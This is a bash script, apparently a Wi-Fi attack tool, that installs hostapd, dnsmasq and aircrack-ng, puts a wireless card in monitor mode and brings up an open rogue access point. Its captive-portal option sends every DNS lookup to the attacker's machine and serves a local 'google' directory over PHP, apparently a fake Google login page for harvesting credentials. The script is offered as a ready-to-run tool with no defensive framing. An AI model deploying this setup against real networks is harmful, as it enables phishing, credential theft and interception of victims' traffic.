#!/bin/bash

# colours
fincolor='\e[0m'
rojo='\e[0;31m'
amarillo='\e[0;33m'
azul='\e[0;34m'
azul2='\e[1;34m'
blanco='\e[0m'
verde='\e[1;32m'


echo -e $azul  " ------------------------------------------------------------------------ " $fincolor
echo -e $azul  "|                                                                        | " $fincolor
echo -e $azul  "|                  _______ _____ _______                   ___   █   █   |  " $fincolor
echo -e $azul  "|  \      /\      /   |    |        |             /| |    /   \   █ █    |  " $fincolor
echo -e $azul  "|   \    /  \    /    |    |__      |     ----   / | |   |  _  |   █     |  " $fincolor
echo -e $azul  "|    \  /    \  /     |    |        |           /__| |   |     |  █ █    | " $fincolor
echo -e $azul  "|     \/      \/   ___|____|     ___|___           | |___ \___/  █   █   | " $fincolor
echo -e $azul  "|                                                                        | " $fincolor
echo -e $azul  " ------------------------------------------------------------------------ " $fincolor
echo -e
echo -e        "                                                           Alonso Martinez"
echo -e

# Install
which dnsmasq >/dev/null 2>&1 || apt-get install dnsmasq -y >>/dev/null

which hostapd >/dev/null 2>&1 || apt-get install hostapd -y >> /dev/null

which airmon-ng >/dev/null 2>&1 || apt-get install aircrack-ng -y >> /dev/null

which xterm >/dev/null 2>&1 || sudo apt-get install xterm -y >> /dev/null

echo -e $rojo "MAIN MENU" $fincolor
echo -e "1 - Access Point"
echo -e "2 - Captive Portal"
echo -e
echo -e "Choose option"
read number

	echo -e "Create an access point"
	echo -e
		inter=`ifconfig -a | awk '/^[a-zA-Z0-9]/{print $1}' | cut -d ':' -f 1` 
		lineas=`echo "$inter" | wc -l`
		echo -e "Available interfaces:"
		echo "$inter" | cat -n
		echo -e "Choose an interfaz: "
		read opcion

echo -e
		if [ "$opcion" -ge 1 ] && [ "$opcion" -le "$lineas" ]; then

		    interfaz=$(echo "$inter" | sed -n "${opcion}p")
		    echo "Interfaz: $interfaz"
		else
		    echo "Invalid option"
		fi

	#comprobar modo monito

	info=$(iwconfig "$interfaz" 2>/dev/null)

	if [[ "$info" == *"Mode:Monitor"* || "$info" == *"Mode:Master"* ]]; then
	    echo "The interface $interfaz is in monitor mode."
	else
	    echo "The interface $interfaz is not monitor mode."
	        xterm -e "airmon-ng start $interfaz" 
	fi
sleep 3


	#Interfaz en modo monitor
#	xterm -e "airmon-ng start $interfaz" 

	ifconfig wlan0 200.200.200.1 netmask 255.255.255.0
	route add -net 200.200.200.0 netmask 255.255.255.0 gw 200.200.200.1 2>/dev/null


case $number in
        1)
		iptables -P FORWARD ACCEPT
		iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

		#CONFIG
host="interface=$interfaz
driver=nl80211
ssid=Red_Oculta
hw_mode=g
channel=12
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0"
archivoHost="hostapd.conf"

echo "$host" > "$archivoHost"


	xterm -e "hostapd hostapd.conf" &


dns="interface=$interfaz
dhcp-range=200.200.200.2,200.200.200.10,255.255.255.0,12h
dhcp-option=3,200.200.200.1
dhcp-option=6,8.8.8.8
server=8.8.8.8
log-queries
log-dhcp
address=/#/200.200.200.1"
archivoDNS="dnsmasq.conf"

echo "$dns" > "$archivoDNS"


sleep 3
		xterm -e "dnsmasq -C dnsmasq.conf -d" &

echo -e
	echo -e "ACCESS POINT OPEN"
	;;

	2)
	echo -e "Create a captive portal"



                #CONFIG
host="interface=$interfaz
driver=nl80211
ssid=Red_Oculta
hw_mode=g
channel=12
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0"
archivoHost="hostapd.conf"

echo "$host" > "$archivoHost"


        xterm -e "hostapd hostapd.conf" &


dns="interface=$interfaz
dhcp-range=200.200.200.2,200.200.200.10,255.255.255.0,12h
dhcp-option=3,200.200.200.1
dhcp-option=6,200.200.200.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/200.200.200.1"
archivoDNS="dnsmasq.conf"

echo "$dns" > "$archivoDNS"



sleep 3
                xterm -e "dnsmasq -C dnsmasq.conf -d" &

		xterm -e " cd google; php -S 200.200.200.1:80" &


	;;
	*)
	echo -e "Number is not valid"
	;;


esac
